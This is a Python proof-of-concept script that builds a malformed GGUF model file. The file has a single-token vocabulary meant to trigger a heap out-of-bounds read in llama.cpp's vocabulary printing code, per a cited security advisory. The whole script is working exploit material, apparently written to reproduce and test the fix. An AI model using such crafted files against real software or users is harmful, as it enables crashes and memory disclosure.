#!/usr/bin/env python3
"""Craft a GGUF with vocab.size()==1 to trigger OOB read in print_info().

Per advisory GHSA-g4cc-763q-h9h6: pre-fix llama_vocab::impl::print_info()
indexes id_to_token[special_bos_id] without bounds check. With a single-
token vocab and the default special_bos_id=1, the read is past the end
of the std::vector — ASAN flags as heap-buffer-overflow.

GGUF metadata layout used:
  - tokenizer.ggml.model = "llama"  (string)
  - tokenizer.ggml.tokens = ["<unk>"]  (array of 1 string)
  - n_tensors = 0  (we only need vocab loading to hit print_info)

GGUF type IDs (from gguf.h):
  STRING=8, ARRAY=9, UINT32=4
"""

import struct
import sys

GGUF_TYPE_UINT32 = 4
GGUF_TYPE_STRING = 8
GGUF_TYPE_ARRAY  = 9


def write_str(f, s: bytes) -> None:
    f.write(struct.pack("<Q", len(s)))
    f.write(s)


def write_kv_string(f, key: bytes, value: bytes) -> None:
    write_str(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_STRING))
    write_str(f, value)


def write_kv_str_array(f, key: bytes, values: list) -> None:
    write_str(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_ARRAY))
    f.write(struct.pack("<I", GGUF_TYPE_STRING))   # elem type
    f.write(struct.pack("<Q", len(values)))         # count
    for v in values:
        write_str(f, v)


def write_kv_uint32(f, key: bytes, value: int) -> None:
    write_str(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_UINT32))
    f.write(struct.pack("<I", value))


def write_kv_float32(f, key: bytes, value: float) -> None:
    write_str(f, key)
    f.write(struct.pack("<I", 6))   # GGUF_TYPE_FLOAT32
    f.write(struct.pack("<f", value))


def craft(filename: str) -> None:
    with open(filename, "wb") as f:
        f.write(b"GGUF")
        f.write(struct.pack("<I", 3))          # version
        f.write(struct.pack("<Q", 0))          # n_tensors
        # KVs to satisfy llama_model_load's hyperparameter requirements without
        # actually building tensors. The vocab arrays are minimal — the trigger
        # is `tokens` having only 1 entry vs default special_bos_id=1.
        kvs = []
        kvs.append(("str", b"general.architecture", b"llama"))
        kvs.append(("u32", b"llama.context_length", 16))
        kvs.append(("u32", b"llama.embedding_length", 16))
        kvs.append(("u32", b"llama.block_count", 1))
        kvs.append(("u32", b"llama.feed_forward_length", 16))
        kvs.append(("u32", b"llama.attention.head_count", 1))
        kvs.append(("u32", b"llama.rope.dimension_count", 16))
        kvs.append(("f32", b"llama.attention.layer_norm_rms_epsilon", 1e-5))
        kvs.append(("str", b"tokenizer.ggml.model", b"llama"))
        kvs.append(("arr", b"tokenizer.ggml.tokens", [b"<unk>"]))
        f.write(struct.pack("<Q", len(kvs)))
        for kind, k, v in kvs:
            if kind == "str":
                write_kv_string(f, k, v)
            elif kind == "u32":
                write_kv_uint32(f, k, v)
            elif kind == "f32":
                write_kv_float32(f, k, v)
            elif kind == "arr":
                write_kv_str_array(f, k, v)


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "vocab_oob.gguf"
    craft(out)
    print(f"wrote {out}")
